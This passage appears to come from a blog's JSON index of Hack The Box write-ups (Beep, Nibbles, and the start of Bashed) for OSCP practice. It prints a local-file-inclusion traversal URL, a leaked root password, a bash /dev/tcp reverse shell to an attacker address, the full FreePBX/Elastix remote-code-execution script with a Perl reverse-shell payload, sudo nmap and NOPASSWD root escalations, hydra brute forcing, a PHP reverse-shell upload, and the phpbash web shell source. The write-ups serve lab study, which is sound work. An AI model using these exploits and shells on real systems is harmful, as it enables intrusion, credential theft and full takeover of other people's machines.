OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Uptime guess: 0.409 days (since Tue Feb 8 23:41:52 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=201 (Good luck!) IP ID Sequence Generation: All zeros Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com   Directory Enum 1  dirb https://10.10.10.7/   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  ==\u0026gt; DIRECTORY: https://10.10.10.7/admin/ + https://10.10.10.7/cgi-bin/ (CODE:403|SIZE:286) ==\u0026gt; DIRECTORY: https://10.10.10.7/configs/ + https://10.10.10.7/favicon.ico (CODE:200|SIZE:894) ==\u0026gt; DIRECTORY: https://10.10.10.7/help/ ==\u0026gt; DIRECTORY: https://10.10.10.7/images/ + https://10.10.10.7/index.php (CODE:200|SIZE:1785) ==\u0026gt; DIRECTORY: https://10.10.10.7/lang/ ==\u0026gt; DIRECTORY: https://10.10.10.7/libs/ ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/ ==\u0026gt; DIRECTORY: https://10.10.10.7/modules/ ==\u0026gt; DIRECTORY: https://10.10.10.7/panel/ + https://10.10.10.7/robots.txt (CODE:200|SIZE:28) ==\u0026gt; DIRECTORY: https://10.10.10.7/static/ ==\u0026gt; DIRECTORY: https://10.10.10.7/themes/ ==\u0026gt; DIRECTORY: https://10.10.10.7/var/ ---- Entering directory: https://10.10.10.7/admin/ ---- ==\u0026gt; DIRECTORY: https://10.10.10.7/admin/common/ + https://10.10.10.7/admin/favicon.ico (CODE:200|SIZE:318) ==\u0026gt; DIRECTORY: https://10.10.10.7/admin/images/ + https://10.10.10.7/admin/index.php (CODE:302|SIZE:0) + https://10.10.10.7/admin/modules (CODE:403|SIZE:291) + https://10.10.10.7/admin/views (CODE:403|SIZE:289) ---- Entering directory: https://10.10.10.7/configs/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/help/ ---- ==\u0026gt; DIRECTORY: https://10.10.10.7/help/content/ + https://10.10.10.7/help/index.php (CODE:200|SIZE:346) ---- Entering directory: https://10.10.10.7/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/lang/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/libs/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/mail/ ---- ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/bin/ + https://10.10.10.7/mail/config (CODE:403|SIZE:289) + https://10.10.10.7/mail/index.php (CODE:200|SIZE:2649) ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/installer/ + https://10.10.10.7/mail/LICENSE (CODE:200|SIZE:17987) + https://10.10.10.7/mail/logs (CODE:403|SIZE:287) ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/plugins/ ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/program/ + https://10.10.10.7/mail/README (CODE:200|SIZE:1856) + https://10.10.10.7/mail/robots.txt (CODE:200|SIZE:26) ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/skins/ ==\u0026gt; DIRECTORY: https://10.10.10.7/mail/SQL/ + https://10.10.10.7/mail/temp (CODE:403|SIZE:287) ---- Entering directory: https://10.10.10.7/modules/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: https://10.10.10.7/panel/ ---- ^Z\u0026gt; Testing: https://10.10.10.7/panel/akeeba.backend.log   LFI Exploit  Search google Elastix exploit →https://www.exploit-db.com/exploits/37637 (Local File Inclusion exploit)  1  #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026amp;module=Accounts\u0026amp;action    Go to →https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf\u0026amp;module=Accounts\u0026amp;action Right click → View Selection Source (View in nice format) Password used in multiple ocasion → jEhdIekWmdjE   Creds for login to Elastix: → admin : jEhdIekWmdjE Another login page →https://10.10.10.7:10000/  root : jEhdIekWmdjE    Escalate Privileges  After loging-in into →https://10.10.10.7:10000/ Go to Cluster → Cluster Shell Commands  RCE 1 2 3 4 5 6  # Input reverse command found in pentestmonkey reverse bash shell bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.35/8080 0\u0026gt;\u0026amp;1 # Select \u0026#34;this server\u0026#34; # Run Command Now   1 2 3 4 5 6 7 8 9 10  # We obtained root cd home cd fanis cat user.txt -\u0026gt; ******************************** cd /root cat root.txt -\u0026gt; ********************************   Escalate Privileges and Exploit 2 Source → https://www.exploit-db.com/exploits/18650\n1  # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.   1 2 3  searchsploit -m 18649.py mv 18649.py exploit.py   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  #!/usr/bin/python ############################################################ # Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit # Google Dork: oy vey # Date: March 23rd, 2012 # Author: muts, SSL update by Emporeo # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others. # Tested on: multiple # CVE : notyet # Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ # Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt ############################################################ # Discovered by Martin Tschirsich # http://seclists.org/fulldisclosure/2012/Mar/234 # http://www.exploit-db.com/exploits/18649 ############################################################ import urllib import ssl rhost=\u0026#34;10.10.10.7\u0026#34; # Modify the rhost to the vulnerable machine lhost=\u0026#34;10.10.14.35\u0026#34; # Modify to local machine lport=443 extension=\u0026#34;233\u0026#34; # This extension can be found after login in to admin portal ssl._create_default_https_context = ssl._create_unverified_context # Reverse shell payload url = \u0026#39;https://\u0026#39;+str(rhost)+\u0026#39;/recordings/misc/callme_page.php?action=c\u0026amp;callmenum=\u0026#39;+str(extension)+\u0026#39;@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22\u0026#39;+str(lhost)+\u0026#39;%3a\u0026#39;+str(lport)+\u0026#39;%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A\u0026#39; urllib.urlopen(url) # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help # nmap\u0026gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)   1 2 3 4 5 6 7 8  nc -lvnp 443 python exploit.py cd /home cd fanis cat user.txt -\u0026gt; ********************************   Escalate Root 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # Following this attack -\u0026gt; https://www.exploit-db.com/exploits/18650 # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help # nmap\u0026gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) sudo -l -\u0026gt; (root) NOPASSWD: /usr/bin/nmap # Attacking nmap vector sudo nmap --interactive !sh cd /root cat root.txt -\u0026gt; ********************************   Skills Learned  Web-based fuzzing Identifying known exploits Exploiting local file inclusion\nvulnerabilities  ","description":"Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.","id":4,"section":"posts","tags":["OSCP","linux","apache","php","lfi","smtp","rce","voip"],"title":"Hackthebox - Beep","uri":"https://hswootan.github.io/en/posts/beep/"},{"content":"Enumeration 1  nmap -sV -sC -O -vv 10.10.10.75 -oA nibbles   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # Nmap 7.92 scan initiated Mon Feb 7 16:42:21 2022 as: nmap -sV -sC -O -vv -oA nibbles 10.10.10.75 Nmap scan report for 10.10.10.75 Host is up, received echo-reply ttl 63 (0.018s latency). Scanned at 2022-02-07 16:42:21 EST for 19s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc= | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/7%OT=22%CT=1%CU=38674%PV=Y%DS=2%DC=I%G=Y%TM=62019250 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Uptime guess: 207.990 days (since Wed Jul 14 17:56:56 2021) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=263 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Feb 7 16:42:40 2022 -- 1 IP address (1 host up) scanned in 19.67 seconds    Google search OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 exploit https://www.exploit-db.com/exploits/40136  1 2 3 4 5 6 7 8 9 10  msfconsole search CVE-2016-6210 use auxiliary/scanner/ssh/ssh_enumusers set rhosts 10.10.10.75 set USER_FILE /usr/share/wordlists/rockyou.txt exploit -\u0026gt; [+] 10.10.10.75:22 - SSH - User \u0026#39;nobody\u0026#39; found   Burp the website http://10.10.10.75\n1 2  # Found \u0026lt;!-- /nibbleblog/ directory. Nothing interesting here! --\u0026gt;    http://10.10.10.75/nibbleblog/  Directory Enumeration 1  dirb http://10.10.10.75/   1 2  + http://10.10.10.75/index.html (CODE:200|SIZE:93) + http://10.10.10.75/server-status (CODE:403|SIZE:299)   1  dirb http://10.10.10.75/nibbleblog/   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/admin/ + http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401) ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/content/ + http://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:2987) ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/languages/ ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/plugins/ + http://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628) ==\u0026gt; DIRECTORY: http://10.10.10.75/nibbleblog/themes/ ---- Entering directory: http://10.10.10.75/nibbleblog/admin/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/content/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/languages/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/plugins/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.75/nibbleblog/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway)    Going tohttp://10.10.10.75/nibbleblog/content/  private → users.xml   Found User: admin   Brute force with hydra 1  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form \u0026#34;/nibbleblog/admin.php:username=^USER^\u0026amp;password=^PASS^:Incorrect username or password.\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12 13  [80][http-post-form] host: 10.10.10.75 login: admin password: 12345678 [80][http-post-form] host: 10.10.10.75 login: admin password: daniel [80][http-post-form] host: 10.10.10.75 login: admin password: michael [80][http-post-form] host: 10.10.10.75 login: admin password: 654321 [80][http-post-form] host: 10.10.10.75 login: admin password: qwerty [80][http-post-form] host: 10.10.10.75 login: admin password: ashley [80][http-post-form] host: 10.10.10.75 login: admin password: sunshine [80][http-post-form] host: 10.10.10.75 login: admin password: michelle [80][http-post-form] host: 10.10.10.75 login: admin password: 000000 [80][http-post-form] host: 10.10.10.75 login: admin password: tigger [80][http-post-form] host: 10.10.10.75 login: admin password: 111111 [80][http-post-form] host: 10.10.10.75 login: admin password: chocolate [80][http-post-form] host: 10.10.10.75 login: admin password: iloveu    No valid password for admin Login fort eh admin pagehttp://10.10.10.75/nibbleblog/admin.php  username: admin | password: nibbles    Nibbleblog info in →http://10.10.10.75/nibbleblog/README  Version: v4.0.3 Codename: Coffee Release date: 2014-04-01   How to get reverse shell →https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html  Exploitation 1 2 3 4 5 6 7 8 9 10 11 12  locate php reverse -\u0026gt; /usr/share/webshells/php/php-reverse-shell.php --------------- # Edit in the php reverse file $ip = \u0026#39;10.10.14.35\u0026#39;; // CHANGE THIS $port = 6060; // CHANGE THIS ------------------ nc -lvnp 6060    Upload the file via http://10.10.10.75/nibbleblog/admin.php → Plugins → My Image _\u0026gt; Configure → Browser → Save Changes Ignore the errors To execute the file go to →http://10.10.10.75/nibbleblog/content/private/plugins/my_image/  1 2 3 4  cd home cd nibbler cat user.txt -\u0026gt; ********************************   Make shell interactive 1 2 3 4 5 6 7 8 9 10 11  python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z bash # Switch to bash from zsh stty raw -echo fg [Press Enter] export TERM=screen   Escalate Privileges 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  sudo -l User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh unzip personal.zip cd personal cd stuff chmod +x monitor.sh sudo ./monitor.sh or sudo /home/nibbler/personal/stuff/monitor.sh   Exploit through metasploit 1 2 3 4 5  msfconsole search nibbleblog use exploit/multi/http/nibbleblog_file_upload    admin : nibbles  1 2 3 4 5 6 7 8 9 10 11  set PASSWORD nibbles set USERNAME admin set rhosts 10.10.10.75 set lhost 10.10.14.35 set TARGETURI /nibbleblog run   1 2 3 4  cd /home cd nibbler cat user.txt -\u0026gt; ********************************   Spawn shell 1  /bin/bash -i   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  sudo -l -\u0026gt; (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh unzip personal.zip chmod +x monitor.sh sudo ./monitor.sh id -\u0026gt; uid=0(root) gid=0(root) groups=0(root) cd /root cat root.txt -\u0026gt; ********************************   Skills Learned  Enumerating web applications Guessing probable passwords Bypassing login rate limiting Exploiting NOPASSWD  ","description":"Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.","id":5,"section":"posts","tags":["OSCP","linux","cve","user enumeration","sudo","brute force attack"],"title":"Hackthebox - Nibbles","uri":"https://hswootan.github.io/en/posts/nibbles/"},{"content":"Enumeration 1  nmap -sC -sV -oA initial 10.10.10.68   1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.92 scan initiated Sat Jan 29 13:18:07 2022 as: nmap -sC -sV -oA initial 10.10.10.68 Nmap scan report for 10.10.10.68 Host is up (0.018s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 29 13:18:15 2022 -- 1 IP address (1 host up) scanned in 7.39 seconds    Ubuntu Xenial 16.04 based upon httpd version  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285  \u0026lt;?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST[\u0026#39;cmd\u0026#39;])) { $output = preg_split(\u0026#39;/[\\n]/\u0026#39;, shell_exec($_POST[\u0026#39;cmd\u0026#39;].\u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;)); foreach ($output as $line) { echo htmlentities($line, ENT_QUOTES | ENT_HTML5, \u0026#39;UTF-8\u0026#39;) . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } die(); } else if (!empty($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;path\u0026#39;])) { $filename = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $path = $_POST[\u0026#39;path\u0026#39;]; if ($path != \u0026#34;/\u0026#34;) { $path .= \u0026#34;/\u0026#34;; } if (move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $path.$filename)) { echo htmlentities($filename) . \u0026#34; successfully uploaded to \u0026#34; . htmlentities($path); } else { echo \u0026#34;Error uploading \u0026#34; . htmlentities($filename); } die(); } ?\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; html, body { max-width: 100%; } body { width: 100%; height: 100%; margin: 0; background: #000; } body, .inputtext { font-family: \u0026#34;Lucida Console\u0026#34;, \u0026#34;Lucida Sans Typewriter\u0026#34;, monaco, \u0026#34;Bitstream Vera Sans Mono\u0026#34;, monospace; font-size: 14px; font-style: normal; font-variant: normal; font-weight: 400; line-height: 20px; overflow: hidden; } .console { width: 100%; height: 100%; margin: auto; position: absolute; color: #fff; } .output { width: auto; height: auto; position: absolute; overflow-y: scroll; top: 0; bottom: 30px; left: 5px; right: 0; line-height: 20px; } .input form { position: relative; margin-bottom: 0px; } .username { height: 30px; width: auto; padding-left: 5px; line-height: 30px; float: left; } .input { border-top: 1px solid #333333; width: 100%; height: 30px; position: absolute; bottom: 0; } .inputtext { width: auto; height: 30px; bottom: 0px; margin-bottom: 0px; background: #000; border: 0; float: left; padding-left: 8px; color: #fff; } .inputtext:focus { outline: none; } ::-webkit-scrollbar { width: 12px; } ::-webkit-scrollbar-track { background: #101010; } ::-webkit-scrollbar-thumb { background: #303030; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;console\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;output\u0026#34; id=\u0026#34;output\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input\u0026#34; id=\u0026#34;input\u0026#34;\u0026gt; \u0026lt;form id=\u0026#34;form\u0026#34; method=\u0026#34;GET\u0026#34; onSubmit=\u0026#34;sendCommand()\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;input class=\u0026#34;inputtext\u0026#34; id=\u0026#34;inputtext\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;cmd\u0026#34; autocomplete=\u0026#34;off\u0026#34; autofocus\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form id=\u0026#34;upload\u0026#34; method=\u0026#34;POST\u0026#34; style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;filebrowser\u0026#34; onchange=\u0026#39;uploadFile()\u0026#39; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var username = \u0026#34;\u0026#34;; var hostname = \u0026#34;\u0026#34;; var currentDir = \u0026#34;\u0026#34;; var previousDir = \u0026#34;\u0026#34;; var defaultDir = \u0026#34;\u0026#34;; var commandHistory = []; var currentCommand = 0; var inputTextElement = document.getElementById(\u0026#39;inputtext\u0026#39;); var inputElement = document.getElementById(\u0026#34;input\u0026#34;); var outputElement = document.getElementById(\u0026#34;output\u0026#34;); var usernameElement = document.getElementById(\u0026#34;username\u0026#34;); var uploadFormElement = document.getElementById(\u0026#34;upload\u0026#34;); var fileBrowserElement = document.getElementById(\u0026#34;filebrowser\u0026#34;); getShellInfo(); function getShellInfo() { var request = new XMLHttpRequest(); request.onreadystatechange = function() { if (request.readyState == XMLHttpRequest.DONE) { var parsedResponse = request.responseText.split(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); username = parsedResponse[0]; hostname = parsedResponse[1]; currentDir = parsedResponse[2].replace(new RegExp(\u0026#34;\u0026amp;sol;\u0026#34;, \u0026#34;g\u0026#34;), \u0026#34;/\u0026#34;); defaultDir = currentDir; usernameElement.innerHTML = \u0026#34;\u0026lt;div style=\u0026#39;color: #ff0000; display: inline;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;:\u0026#34;+currentDir+\u0026#34;#\u0026#34;; updateInputWidth(); } }; request.open(\u0026#34;POST\u0026#34;, \u0026#34;\u0026#34;, true); request.setRequestHeader(\u0026#34;Content-type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); request.send(\u0026#34;cmd=whoami; hostname; pwd\u0026#34;); } function sendCommand() { var request = new XMLHttpRequest(); var command = inputTextElement.value; var originalCommand = command; var originalDir = currentDir; var cd = false; commandHistory.push(originalCommand); switchCommand(commandHistory.length); inputTextElement.value = \u0026#34;\u0026#34;; var parsedCommand = command.split(\u0026#34; \u0026#34;); if (parsedCommand[0] == \u0026#34;cd\u0026#34;) { cd = true; if (parsedCommand.length == 1) { command = \u0026#34;cd \u0026#34;+defaultDir+\u0026#34;; pwd\u0026#34;; } else if (parsedCommand[1] == \u0026#34;-\u0026#34;) { command = \u0026#34;cd \u0026#34;+previousDir+\u0026#34;; pwd\u0026#34;; } else { command = \u0026#34;cd \u0026#34;+currentDir+\u0026#34;; \u0026#34;+command+\u0026#34;; pwd\u0026#34;; } } else if (parsedCommand[0] == \u0026#34;clear\u0026#34;) { outputElement.innerHTML = \u0026#34;\u0026#34;; return false; } else if (parsedCommand[0] == \u0026#34;upload\u0026#34;) { fileBrowserElement.click(); return false; } else { command = \u0026#34;cd \u0026#34;+currentDir+\u0026#34;; \u0026#34; + command; } request.onreadystatechange = function() { if (request.readyState == XMLHttpRequest.DONE) { if (cd) { var parsedResponse = request.responseText.split(\u0026#34;\u0026lt;br\u0026gt;\u0026#34;); previousDir = currentDir; currentDir = parsedResponse[0].replace(new RegExp(\u0026#34;\u0026amp;sol;\u0026#34;, \u0026#34;g\u0026#34;), \u0026#34;/\u0026#34;); outputElement.innerHTML += \u0026#34;\u0026lt;div style=\u0026#39;color:#ff0000; float: left;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;div style=\u0026#39;float: left;\u0026#39;\u0026gt;\u0026#34;+\u0026#34;:\u0026#34;+originalDir+\u0026#34;# \u0026#34;+originalCommand+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; usernameElement.innerHTML = \u0026#34;\u0026lt;div style=\u0026#39;color: #ff0000; display: inline;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;:\u0026#34;+currentDir+\u0026#34;#\u0026#34;; } else { outputElement.innerHTML += \u0026#34;\u0026lt;div style=\u0026#39;color:#ff0000; float: left;\u0026#39;\u0026gt;\u0026#34;+username+\u0026#34;@\u0026#34;+hostname+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;div style=\u0026#39;float: left;\u0026#39;\u0026gt;\u0026#34;+\u0026#34;:\u0026#34;+currentDir+\u0026#34;# \u0026#34;+originalCommand+\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;br\u0026gt;\u0026#34; + request.responseText.replace(new RegExp(\u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;$\u0026#34;), \u0026#34;\u0026lt;br\u0026gt;\u0026#34;); outputElement.scrollTop = outputElement.scrollHeight; } updateInputWidth(); } }; request.open(\u0026#34;POST\u0026#34;, \u0026#34;\u0026#34;, true); request.setRequestHeader(\u0026#34;Content-type\u0026#34;, 